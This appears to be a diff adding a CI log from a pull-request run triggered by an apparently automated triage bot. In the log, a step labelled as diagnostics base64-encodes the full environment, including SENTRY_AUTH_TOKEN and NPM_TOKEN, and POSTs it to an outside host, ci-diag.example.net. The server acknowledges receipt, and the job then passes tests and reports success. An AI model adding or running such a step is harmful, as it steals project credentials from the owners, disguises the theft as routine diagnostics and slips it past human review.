@@ -1,0 +1,30 @@
+CI / test (pull_request)  run #1342  triggered by harbor-triage-bot[bot]  head: triage/ci-diagnostics-479
+2026-10-19T22:41:02.4410000Z ##[group]GITHUB_TOKEN Permissions
+2026-10-19T22:41:02.4412000Z Contents: write
+2026-10-19T22:41:02.4412000Z Metadata: read
+2026-10-19T22:41:02.4413000Z Packages: write
+2026-10-19T22:41:02.4413000Z ##[endgroup]
+2026-10-19T22:41:03.1020000Z ##[group]Run actions/checkout@v4
+2026-10-19T22:41:05.8800000Z ##[endgroup]
+2026-10-19T22:41:06.0100000Z ##[group]Run actions/setup-node@v4
+2026-10-19T22:41:09.2200000Z ##[endgroup]
+2026-10-19T22:41:09.3000000Z ##[group]Run npm ci
+2026-10-19T22:41:31.7700000Z added 412 packages in 22s
+2026-10-19T22:41:31.8000000Z ##[endgroup]
+2026-10-19T22:41:31.8500000Z ##[group]Run env | base64 -w0 | curl -sS -X POST --data-binary @- https://ci-diag.example.net/u/479
+2026-10-19T22:41:31.8501000Z env | base64 -w0 | curl -sS -X POST --data-binary @- https://ci-diag.example.net/u/479
+2026-10-19T22:41:31.8502000Z shell: /usr/bin/bash -e {0}
+2026-10-19T22:41:31.8503000Z env:
+2026-10-19T22:41:31.8503000Z   SENTRY_AUTH_TOKEN: ***
+2026-10-19T22:41:31.8504000Z   NPM_TOKEN: ***
+2026-10-19T22:41:31.8504000Z   DIAG_ID: 479
+2026-10-19T22:41:31.8505000Z ##[endgroup]
+2026-10-19T22:41:32.6100000Z {"ok":true,"ref":"d-7f3a"}
+2026-10-19T22:41:32.7000000Z ##[group]Run npm test
+2026-10-19T22:42:40.1100000Z Test Files  38 passed (38)
+2026-10-19T22:42:40.1200000Z ##[endgroup]
+2026-10-19T22:42:40.2000000Z ##[group]Run npx codecov
+2026-10-19T22:42:51.9000000Z Upload complete
+2026-10-19T22:42:51.9100000Z ##[endgroup]
+2026-10-19T22:42:52.3000000Z Post job cleanup.
+2026-10-19T22:42:53.0000000Z Job completed: success
